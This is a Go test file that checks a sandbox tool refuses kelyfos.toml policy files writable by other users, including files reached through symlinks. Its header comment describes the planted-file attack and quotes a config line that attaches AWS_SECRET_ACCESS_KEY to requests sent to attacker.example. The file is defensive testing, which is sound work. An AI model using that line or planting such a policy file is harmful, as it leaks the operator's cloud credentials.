package config

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// P7-17/F21 — a discovered kelyfos.toml is trusted with host-wide powers.
//
// Find walks from the working directory to / and takes the first kelyfos.toml
// it meets, with no check on who owns it or whether anyone else can write it.
// That file then names an absolute workspace (packed into the guest and, on
// shutdown, synced back over that host directory), an absolute plugin.path
// (packed read-only into the guest, so its contents become readable inside the
// sandbox), an allow list, and
// secrets = ["AWS_SECRET_ACCESS_KEY@attacker.example"], which reads the
// operator's environment and attaches it to requests to a domain the same file
// allows. A file another local user leaves at /tmp/kelyfos.toml gets all of
// that on a plain `kelyfos run` beneath it.
//
// This is the shape git fixed with safe.directory and sudo fixed with the
// ownership rule on sudoers, and the answer here is the same: a file the
// invoking user does not own, or that somebody else can write, is refused by
// name with the fix in the message.

func writeToml(t *testing.T, dir string, mode os.FileMode) string {
	t.Helper()
	path := filepath.Join(dir, FileName)
	if err := os.WriteFile(path, []byte("[sandbox]\nimage = \"dev\"\n"), mode); err != nil {
		t.Fatal(err)
	}
	// os.WriteFile is subject to the umask, so set the mode explicitly.
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestF21_AWorldWritablePolicyIsRefused(t *testing.T) {
	for _, mode := range []os.FileMode{0o666, 0o622, 0o662, 0o777, 0o606} {
		t.Run(mode.String(), func(t *testing.T) {
			path := writeToml(t, t.TempDir(), mode)
			err := Trust(path, true)
			if err == nil {
				t.Fatalf("a %04o policy file was trusted", mode)
			}
			// The message has to name the file and say what to do, or it is a
			// refusal somebody works around by deleting the file.
			if !strings.Contains(err.Error(), path) {
				t.Errorf("the refusal does not name the file: %v", err)
			}
			if !strings.Contains(err.Error(), "chmod") {
				t.Errorf("the refusal does not name the fix: %v", err)
			}
		})
	}
}

func TestF21_AnOrdinaryPolicyIsTrusted(t *testing.T) {
	for _, mode := range []os.FileMode{0o600, 0o644, 0o640, 0o400} {
		path := writeToml(t, t.TempDir(), mode)
		if err := Trust(path, true); err != nil {
			t.Errorf("a %04o policy file the user owns was refused: %v", mode, err)
		}
	}
}

// The group bit is the half that would have been worse than the finding if it
// were unconditional. This project's own development VM runs umask 0002, so
// `cat > kelyfos.toml` — which is what every cookbook recipe and every
// acceptance script in this repository does — produces mode 0664. Refusing
// that outright would have turned the cookbook job red on the machine it runs
// on, which is why the rule asks whose group it is rather than only whether the
// bit is set.
//
// The verdict is environment-dependent by design, so the test asserts that
// Trust agrees with the rule rather than restating an answer: under a
// user-private group a 0664 file is writable by the owner and nobody else, and
// under a shared primary group it is not.
func TestF21_TheGroupBitIsJudgedByWhoseGroupItIs(t *testing.T) {
	path := writeToml(t, t.TempDir(), 0o664)
	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	why := writableByOthers(fi)
	err = Trust(path, true)
	switch {
	case why == "" && err != nil:
		t.Errorf("a 0664 file under a user-private group was refused: %v", err)
	case why != "" && err == nil:
		t.Errorf("a 0664 file was trusted although %s", why)
	}
	t.Logf("this machine: uid %d gid %d, 0664 verdict %q", os.Getuid(), os.Getgid(), why)

	// Whatever the group turns out to be, the world bit is not negotiable.
	if fi, err := os.Stat(writeToml(t, t.TempDir(), 0o666)); err == nil {
		if writableByOthers(fi) == "" {
			t.Error("a 0666 file was judged writable by nobody but its owner")
		}
	}
	// And a mode with neither bit is always fine.
	if fi, err := os.Stat(writeToml(t, t.TempDir(), 0o644)); err == nil {
		if why := writableByOthers(fi); why != "" {
			t.Errorf("a 0644 file was judged writable by others: %s", why)
		}
	}
}

// A file passed explicitly with --policy skips the walk-up, so the "somebody
// left it in a parent directory" case does not apply — but it still gets the
// writability check, because a file anybody can rewrite is not made safe by
// being named.
func TestF21_ANamedPolicyStillGetsTheWritabilityCheck(t *testing.T) {
	path := writeToml(t, t.TempDir(), 0o666)
	if err := Trust(path, false); err == nil {
		t.Error("a world-writable policy named with --policy was trusted")
	}
	ok := writeToml(t, t.TempDir(), 0o644)
	if err := Trust(ok, false); err != nil {
		t.Errorf("a named, ordinary policy was refused: %v", err)
	}
}

// A file that is not there is not this function's error to report — the
// caller's own "no policy" and "--policy names nothing" paths already say the
// right thing, and duplicating them here would give two different messages for
// one condition.
func TestF21_AMissingFileIsNotATrustFailure(t *testing.T) {
	if err := Trust(filepath.Join(t.TempDir(), "nope.toml"), true); err != nil {
		t.Errorf("a missing file was reported as untrusted: %v", err)
	}
}

// A symlink is checked as a symlink as well as through it: a link the invoking
// user does not own points wherever its owner chooses, whatever the target's
// own permissions say.
func TestF21_ASymlinkIsCheckedOnBothEnds(t *testing.T) {
	realDir := t.TempDir()
	real := writeToml(t, realDir, 0o644)

	linkDir := t.TempDir()
	link := filepath.Join(linkDir, FileName)
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("symlinks are not available here: %v", err)
	}
	if err := Trust(link, true); err != nil {
		t.Errorf("a symlink the user owns, to a file the user owns, was refused: %v", err)
	}

	// And the target's mode still counts through the link.
	if err := os.Chmod(real, 0o666); err != nil {
		t.Fatal(err)
	}
	if err := Trust(link, true); err == nil {
		t.Error("a symlink to a world-writable policy was trusted")
	}
}
